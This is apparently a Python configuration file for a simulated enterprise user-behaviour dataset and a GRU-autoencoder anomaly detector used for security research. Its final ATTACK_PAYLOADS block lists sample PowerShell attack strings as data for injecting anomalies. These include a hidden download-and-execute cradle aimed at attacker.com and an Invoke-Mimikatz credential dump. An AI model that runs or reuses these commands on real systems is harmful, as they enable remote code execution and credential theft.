from models.enums import (
    DepartmentName,
    OperatingSystem,
    DeviceType,
    Browser,
    AccessLevel,
    SensitivityLevel,
    ResourceType,
    AttackType,
)

RANDOM_SEED = 42

# General configurations
DEPARTMENTS = [
    DepartmentName.FINANCE,
    DepartmentName.ENGINEERING,
    DepartmentName.HR,
    DepartmentName.SALES,
    DepartmentName.IT,
    DepartmentName.MARKETING,
]

# =====================================================
# Simulation Settings
# =====================================================

SIMULATION_CONFIG = {
    "employee_count": 200,
    "min_devices": 1,
    "max_devices": 3,
    "min_session_minutes": 10,
    "max_session_minutes": 120,
    "max_actions_per_session": 30,
    "simulation_days": 30,
}

DEFAULT_DEVICE_PROBABILITIES = {
    DeviceType.LAPTOP: 0.70,
    DeviceType.DESKTOP: 0.20,
    DeviceType.MOBILE: 0.10,
}

BEHAVIOR_PROFILE_DEFAULTS = {
    "average_session_length": 35,
    "session_length_stddev": 8,
    "average_actions": 14,
    "actions_stddev": 3,
    "average_sessions_per_day": 3,
    "remote_work_probability": 0.25,
}

# =====================================================
# Validation and Time Settings
# =====================================================
WORKING_HOUR_BUFFER_MINUTES = 120

WEEKEND_WORK_PROBABILITY = {
    DepartmentName.FINANCE: 0.02,
    DepartmentName.ENGINEERING: 0.10,
    DepartmentName.HR: 0.01,
    DepartmentName.SALES: 0.15,
    DepartmentName.IT: 0.25,
    DepartmentName.MARKETING: 0.05
}

OFFICE_LOCATIONS = ["New York", "San Francisco", "London", "Tokyo", "Munich"]

# Department specific distributions for preferred Operating Systems
# Values sum to 1.0
DEPARTMENT_OS_DISTRIBUTION = {
    DepartmentName.FINANCE: {
        OperatingSystem.WINDOWS: 0.85,
        OperatingSystem.MACOS: 0.15,
        OperatingSystem.LINUX: 0.0
    },
    DepartmentName.ENGINEERING: {
        OperatingSystem.LINUX: 0.50,
        OperatingSystem.MACOS: 0.35,
        OperatingSystem.WINDOWS: 0.15
    },
    DepartmentName.HR: {
        OperatingSystem.WINDOWS: 0.90,
        OperatingSystem.MACOS: 0.10,
        OperatingSystem.LINUX: 0.0
    },
    DepartmentName.SALES: {
        OperatingSystem.WINDOWS: 0.80,
        OperatingSystem.MACOS: 0.20,
        OperatingSystem.LINUX: 0.0
    },
    DepartmentName.IT: {
        OperatingSystem.LINUX: 0.60,
        OperatingSystem.WINDOWS: 0.20,
        OperatingSystem.MACOS: 0.20
    },
    DepartmentName.MARKETING: {
        OperatingSystem.WINDOWS: 0.60,
        OperatingSystem.MACOS: 0.40,
        OperatingSystem.LINUX: 0.0
    }
}

# Browser distribution by Operating System
OS_BROWSER_DISTRIBUTION = {
    OperatingSystem.WINDOWS: {
        Browser.CHROME: 0.60,
        Browser.EDGE: 0.25,
        Browser.FIREFOX: 0.15
    },
    OperatingSystem.LINUX: {
        Browser.CHROME: 0.50,
        Browser.FIREFOX: 0.50
    },
    OperatingSystem.MACOS: {
        Browser.CHROME: 0.50,
        Browser.SAFARI: 0.40,
        Browser.FIREFOX: 0.10
    },
    OperatingSystem.IOS: {
        Browser.SAFARI: 0.90,
        Browser.CHROME: 0.10
    },
    OperatingSystem.ANDROID: {
        Browser.CHROME: 0.85,
        Browser.FIREFOX: 0.15
    }
}

# Device type distribution by Department for primary device
DEPARTMENT_DEVICE_TYPE_DISTRIBUTION = {
    DepartmentName.FINANCE: {
        DeviceType.LAPTOP: 0.70,
        DeviceType.DESKTOP: 0.30
    },
    DepartmentName.ENGINEERING: {
        DeviceType.LAPTOP: 0.85,
        DeviceType.DESKTOP: 0.15
    },
    DepartmentName.HR: {
        DeviceType.LAPTOP: 0.60,
        DeviceType.DESKTOP: 0.40
    },
    DepartmentName.SALES: {
        DeviceType.LAPTOP: 0.80,
        DeviceType.DESKTOP: 0.20
    },
    DepartmentName.IT: {
        DeviceType.LAPTOP: 0.70,
        DeviceType.DESKTOP: 0.30
    },
    DepartmentName.MARKETING: {
        DeviceType.LAPTOP: 0.80,
        DeviceType.DESKTOP: 0.20
    }
}

# Roles per department
ROLES_BY_DEPARTMENT = {
    DepartmentName.FINANCE: ["Accountant", "Finance Analyst", "Treasurer", "Finance Director"],
    DepartmentName.ENGINEERING: ["Software Engineer", "QA Engineer", "DevOps Engineer", "Engineering Manager", "Architect"],
    DepartmentName.HR: ["HR Coordinator", "Recruiter", "HR Specialist", "HR Director"],
    DepartmentName.SALES: ["Sales Representative", "Account Executive", "Sales Manager", "Sales Director"],
    DepartmentName.IT: ["Systems Administrator", "Helpdesk Support", "Network Engineer", "Security Analyst", "IT Director"],
    DepartmentName.MARKETING: ["Marketing Coordinator", "Marketing Specialist", "Marketing Manager", "Marketing Director"]
}

# Access level mapping based on role suffixes or specific roles
ROLE_ACCESS_MAPPING = {
    "Director": AccessLevel.CRITICAL,
    "Manager": AccessLevel.HIGH,
    "Administrator": AccessLevel.HIGH,
    "Architect": AccessLevel.HIGH,
    "Security Analyst": AccessLevel.HIGH,
    "DevOps Engineer": AccessLevel.MEDIUM,
    "Systems Administrator": AccessLevel.HIGH,
    "Network Engineer": AccessLevel.HIGH,
    "Software Engineer": AccessLevel.MEDIUM,
    "Finance Analyst": AccessLevel.MEDIUM,
    "Treasurer": AccessLevel.MEDIUM,
    "HR Specialist": AccessLevel.MEDIUM,
    "Account Executive": AccessLevel.MEDIUM,
    "Accountant": AccessLevel.LOW,
    "QA Engineer": AccessLevel.LOW,
    "Recruiter": AccessLevel.LOW,
    "HR Coordinator": AccessLevel.LOW,
    "Sales Representative": AccessLevel.LOW,
    "Helpdesk Support": AccessLevel.LOW,
    "Marketing Specialist": AccessLevel.MEDIUM,
    "Marketing Coordinator": AccessLevel.LOW,
}

# Resource templates defined in the system
RESOURCES_CONFIG = [
    {"name": ResourceType.PAYROLL, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.HR, DepartmentName.IT]},
    {"name": ResourceType.FINANCE_DB, "type": "Database", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.IT]},
    {"name": ResourceType.EMAIL, "type": "SaaS", "sensitivity": SensitivityLevel.INTERNAL, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.ENGINEERING, DepartmentName.HR, DepartmentName.SALES, DepartmentName.IT, DepartmentName.MARKETING]},
    {"name": ResourceType.GITHUB, "type": "SaaS", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.ENGINEERING, DepartmentName.IT]},
    {"name": ResourceType.JIRA, "type": "SaaS", "sensitivity": SensitivityLevel.INTERNAL, "allowed_departments": [DepartmentName.ENGINEERING, DepartmentName.SALES, DepartmentName.IT, DepartmentName.HR, DepartmentName.FINANCE, DepartmentName.MARKETING]},
    {"name": ResourceType.SLACK, "type": "SaaS", "sensitivity": SensitivityLevel.INTERNAL, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.ENGINEERING, DepartmentName.HR, DepartmentName.SALES, DepartmentName.IT, DepartmentName.MARKETING]},
    {"name": ResourceType.FILE_SERVER, "type": "Network Share", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.ENGINEERING, DepartmentName.IT, DepartmentName.FINANCE, DepartmentName.HR, DepartmentName.MARKETING]},
    {"name": ResourceType.HR_PORTAL, "type": "Web Application", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.HR, DepartmentName.IT]},
    {"name": ResourceType.CRM, "type": "SaaS", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.SALES, DepartmentName.IT, DepartmentName.MARKETING]},
    {"name": ResourceType.ADMIN_CONSOLE, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.IT]},
    {"name": ResourceType.SERVERS, "type": "Infrastructure", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.IT]},
    {"name": ResourceType.VPN, "type": "Network Service", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.IT, DepartmentName.ENGINEERING, DepartmentName.FINANCE, DepartmentName.HR, DepartmentName.SALES, DepartmentName.MARKETING]},
    {"name": ResourceType.CONFLUENCE, "type": "SaaS", "sensitivity": SensitivityLevel.INTERNAL, "allowed_departments": [DepartmentName.ENGINEERING, DepartmentName.IT, DepartmentName.FINANCE, DepartmentName.HR, DepartmentName.SALES, DepartmentName.MARKETING]},
    {"name": ResourceType.TERMINAL, "type": "App", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.ENGINEERING, DepartmentName.IT]},
    {"name": ResourceType.HRMS, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.HR, DepartmentName.IT]},
    {"name": ResourceType.EMPLOYEE_RECORDS, "type": "Database", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.HR, DepartmentName.IT]},
    {"name": ResourceType.ERP, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.IT]},
    {"name": ResourceType.ACCOUNTING, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.IT]},
    {"name": ResourceType.INVOICES, "type": "Database", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.IT]},
    {"name": ResourceType.MEETINGS, "type": "SaaS", "sensitivity": SensitivityLevel.INTERNAL, "allowed_departments": [DepartmentName.FINANCE, DepartmentName.ENGINEERING, DepartmentName.HR, DepartmentName.SALES, DepartmentName.IT, DepartmentName.MARKETING]},
    {"name": ResourceType.ANALYTICS, "type": "SaaS", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.MARKETING, DepartmentName.SALES, DepartmentName.FINANCE, DepartmentName.IT]},
    {"name": ResourceType.CAMPAIGN_DASHBOARD, "type": "Web Application", "sensitivity": SensitivityLevel.CONFIDENTIAL, "allowed_departments": [DepartmentName.MARKETING, DepartmentName.IT]},
    {"name": ResourceType.MONITORING, "type": "Web Application", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.IT]},
    {"name": ResourceType.FIREWALL, "type": "Network Service", "sensitivity": SensitivityLevel.RESTRICTED, "allowed_departments": [DepartmentName.IT]}
]

# Work Hours by Department
WORK_HOURS_CONFIG = {
    DepartmentName.FINANCE: (9, 18),
    DepartmentName.ENGINEERING: (9, 18),
    DepartmentName.HR: (9, 18),
    DepartmentName.SALES: (8, 17),
    DepartmentName.IT: (8, 18),
    DepartmentName.MARKETING: (9, 18)
}

# Department resource preferences
DEPARTMENT_RESOURCE_PREFERENCES = {
    DepartmentName.FINANCE: {
        "frequent": [ResourceType.ERP, ResourceType.ACCOUNTING, ResourceType.INVOICES, ResourceType.EMAIL],
        "rare": [ResourceType.GITHUB, ResourceType.MEETINGS]
    },
    DepartmentName.ENGINEERING: {
        "frequent": [ResourceType.GITHUB, ResourceType.JIRA, ResourceType.CONFLUENCE, ResourceType.TERMINAL, ResourceType.SLACK],
        "rare": [ResourceType.PAYROLL]
    },
    DepartmentName.HR: {
        "frequent": [ResourceType.HRMS, ResourceType.PAYROLL, ResourceType.EMPLOYEE_RECORDS, ResourceType.EMAIL],
        "rare": [ResourceType.JIRA]
    },
    DepartmentName.SALES: {
        "frequent": [ResourceType.CRM, ResourceType.EMAIL, ResourceType.MEETINGS, ResourceType.SLACK],
        "rare": [ResourceType.FILE_SERVER]
    },
    DepartmentName.IT: {
        "frequent": [ResourceType.ADMIN_CONSOLE, ResourceType.SERVERS, ResourceType.VPN, ResourceType.MONITORING, ResourceType.FIREWALL, ResourceType.FILE_SERVER],
        "rare": []
    },
    DepartmentName.MARKETING: {
        "frequent": [ResourceType.ANALYTICS, ResourceType.CAMPAIGN_DASHBOARD, ResourceType.EMAIL, ResourceType.SLACK, ResourceType.CRM],
        "rare": [ResourceType.FILE_SERVER]
    }
}

# VPN connection probability by department
VPN_PROBABILITIES = {
    DepartmentName.FINANCE: 0.15,
    DepartmentName.ENGINEERING: 0.45,
    DepartmentName.HR: 0.05,
    DepartmentName.SALES: 0.70,
    DepartmentName.IT: 0.60,
    DepartmentName.MARKETING: 0.20
}

# =====================================================
# Anomaly Injection Configurations
# =====================================================
ANOMALY_CONFIG = {
    "global_anomaly_rate": 0.08,  # ~8% of sessions will be anomalous
    "attack_probabilities": {
        AttackType.IMPOSSIBLE_TRAVEL: 0.10,
        AttackType.BRUTE_FORCE: 0.10,
        AttackType.CREDENTIAL_STUFFING: 0.08,
        AttackType.PRIVILEGE_ESCALATION: 0.08,
        AttackType.DATA_EXFILTRATION: 0.10,
        AttackType.INSIDER_THREAT: 0.08,
        AttackType.OFF_HOURS_ACCESS: 0.08,
        AttackType.LATERAL_MOVEMENT: 0.08,
        AttackType.USB_DATA_THEFT: 0.06,
        AttackType.MALWARE_EXECUTION: 0.06,
        AttackType.SUSPICIOUS_POWERSHELL: 0.06,
        AttackType.BEACONING_C2: 0.04,
        AttackType.DEVICE_SPOOFING: 0.04,
        AttackType.LOW_SLOW_EXFILTRATION: 0.02,
        AttackType.INSIDER_DRIFT: 0.02,
    },
    "attack_severities": {
        AttackType.OFF_HOURS_ACCESS: 40.0,
        AttackType.INSIDER_THREAT: 60.0,
        AttackType.IMPOSSIBLE_TRAVEL: 60.0,
        AttackType.BRUTE_FORCE: 80.0,
        AttackType.CREDENTIAL_STUFFING: 80.0,
        AttackType.LATERAL_MOVEMENT: 80.0,
        AttackType.USB_DATA_THEFT: 80.0,
        AttackType.MALWARE_EXECUTION: 95.0,
        AttackType.PRIVILEGE_ESCALATION: 95.0,
        AttackType.DATA_EXFILTRATION: 95.0,
        AttackType.SUSPICIOUS_POWERSHELL: 90.0,
        AttackType.BEACONING_C2: 85.0,
        AttackType.DEVICE_SPOOFING: 75.0,
        AttackType.LOW_SLOW_EXFILTRATION: 85.0,
        AttackType.INSIDER_DRIFT: 50.0,
    },
    "risk_modifiers": {
        "failed_login": 5.0,
        "unauthorized_admin": 15.0,
        "large_transfer": 20.0,
        "suspicious_cli": 20.0,
    }
}

# Configurable Risk Engine Weights
RISK_WEIGHTS = {
    "behavior_deviation": 0.30,
    "attack_severity": 0.40,
    "reconstruction_error": 0.15,
    "classifier_confidence": 0.15
}

# Behavior Knowledge Base settings
ENABLE_DRIFT_MONITORING = True   # Compute continuous behavioral deviations for all sessions
DRIFT_WINDOW_SIZE = 10           # Slide baseline over the last 10 sessions

# Drift Monitor deviation weights (must sum to 100.0 for 0-100 scale)
DRIFT_DEVIATION_WEIGHTS = {
    "location_deviation": 25.0,
    "device_deviation": 15.0,
    "browser_deviation": 5.0,
    "operating_system_deviation": 5.0,
    "working_hours_deviation": 20.0,
    "resource_access_deviation": 30.0,
}

# Behavior score threshold for baseline updates.
# Sessions with behavior_score >= this value will NOT update the sliding window,
# preventing anomalous sessions from poisoning the behavioral baseline.
DRIFT_UPDATE_THRESHOLD = 25.0

# Minimum standard deviation for working hours (prevents division by zero
# and avoids extreme sensitivity when all logins occur at the same hour).
DRIFT_MIN_HOUR_STDDEV = 1.0

# Laplace (additive) smoothing for resource_access_deviation.
# Adds `alpha` pseudo-observations to every resource count before computing
# the frequency ratio, shrinking cold-start scores away from the hard 1.0
# ceiling.  Larger alpha → more shrinkage toward the global mean.
#   alpha = 0 → no smoothing (original behaviour)
#   alpha = 1 → light smoothing
#   alpha = 2 → moderate smoothing (default — targets normal avg ~0.25–0.45)
RESOURCE_DEVIATION_LAPLACE_ALPHA = 2.0

# ===========================================================================
# GRU Autoencoder — Anomaly Detection Engine (Phase 5)
# ===========================================================================
# These defaults are used when training via src/train_gru.py.  Override them
# with CLI flags or by editing this block before a production training run.

GRU_HIDDEN_SIZE: int   = 128      # GRU hidden units per layer
GRU_NUM_LAYERS:  int   = 2        # Number of stacked GRU layers
GRU_DROPOUT:     float = 0.3      # Dropout between GRU layers (0 = off)
GRU_SEQ_LEN:     int   = 50       # Fixed sequence length (matches SequenceBuilder.max_len)
GRU_FEATURE_DIM: int   = 21       # Event feature dimension (matches SequenceBuilder.feature_dim)

GRU_TRAIN_EPOCHS:   int   = 50    # Maximum training epochs
GRU_BATCH_SIZE:     int   = 64    # DataLoader batch size
GRU_LEARNING_RATE:  float = 1e-3  # AdamW initial learning rate
GRU_WEIGHT_DECAY:   float = 1e-5  # AdamW L2 regularisation
GRU_GRAD_CLIP:      float = 1.0   # Gradient norm clipping (0 = disabled)
GRU_PATIENCE:       int   = 10    # Early-stopping patience (epochs)
GRU_LR_PATIENCE:    int   = 5     # ReduceLROnPlateau patience
GRU_LR_FACTOR:      float = 0.5   # ReduceLROnPlateau decay factor
GRU_SEED:           int   = 42    # Global random seed

# Anomaly threshold estimation percentile (applied to validation reconstruction errors).
# Increase to reduce false positives; decrease to increase recall.
GRU_THRESHOLD_PERCENTILE: float = 95.0

# File paths (relative to the project root when running src/train_gru.py)
GRU_CHECKPOINT_PATH:  str = "models/gru_autoencoder.pt"
GRU_OUTPUT_DIR:       str = "outputs"
GRU_PLOTS_DIR:        str = "outputs/plots"

ATTACK_PAYLOADS = {
    "malware_filenames": [
        "mimikatz.exe",
        "wannacry.exe",
        "revshell.ps1",
        "pwnage.elf",
        "keylogger.exe",
        "cobaltstrike.beacon"
    ],
    "powershell_commands": [
        "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand a2V5bG9nZ2Vy",
        "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://attacker.com/payload'))\"",
        "powershell.exe Invoke-Mimikatz -DumpCreds",
        "powershell.exe -ep bypass -command Get-Process"
    ],
    "beacon_intervals": [5, 10, 30, 60],
    "suspicious_files": [
        "salaries_2026.xlsx",
        "passwords.txt",
        "source_code.zip",
        "db_dump.sql",
        "customer_credit_cards.csv",
        "m&a_plans.docx"
    ],
    "c2_domains": [
        "malicious-c2.com",
        "198.51.100.42",
        "super-safe-update.org",
        "shady-traffic.net"
    ]
}
